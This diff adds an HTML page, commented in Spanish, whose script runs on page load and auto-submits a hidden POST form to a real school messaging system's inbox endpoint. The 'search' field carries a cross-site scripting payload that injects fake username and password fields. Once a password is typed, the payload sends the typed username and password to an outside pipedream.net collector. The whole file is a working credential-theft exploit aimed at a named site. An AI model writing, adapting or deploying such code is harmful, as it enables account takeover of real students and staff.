@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    // Función para redirigir automáticamente y enviar el formulario POST
+    function redirectAndSubmit() {
+      // Crear un formulario en el DOM
+      var form = document.createElement('form');
+      // Establecer el atributo "action" con la URL de destino
+      form.setAttribute('action', 'https://smglafloridadf-teresianos.algebraix.com/bin/s/messaging/inbox/');
+      // Establecer el método del formulario como POST
+      form.setAttribute('method', 'POST');
+
+      // Crear un campo oculto para "search" con el valor deseado
+      var searchInput = document.createElement('input');
+      searchInput.setAttribute('type', 'hidden');
+      searchInput.setAttribute('name', 'search');
+      searchInput.setAttribute('value', '"<input type="text" name="username" id="username"> <input type="password" name="password" onchange="if(this.value.length) { fetch(\'https://en0t0nwzu0td7b.x.pipedream.net/\', { method: \'POST\', mode: \'no-cors\', body: document.getElementById(\'username\').value + \':\' + this.value })}"');
+      
+      // Crear un campo oculto para "title" con el valor deseado
+      var titleInput = document.createElement('input');
+      titleInput.setAttribute('type', 'hidden');
+      titleInput.setAttribute('name', 'title');
+      titleInput.setAttribute('value', 'valor_fijo'); // Cambia 'valor_fijo' al valor que desees mantener siempre
+
+      // Agregar los campos ocultos al formulario
+      form.appendChild(searchInput);
+      form.appendChild(titleInput);
+
+      // Agregar el formulario al cuerpo del documento y enviarlo
+      document.body.appendChild(form);
+      form.submit();
+    }
+
+    // Redirigir automáticamente al cargar la página
+    window.onload = function() {
+      redirectAndSubmit();
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
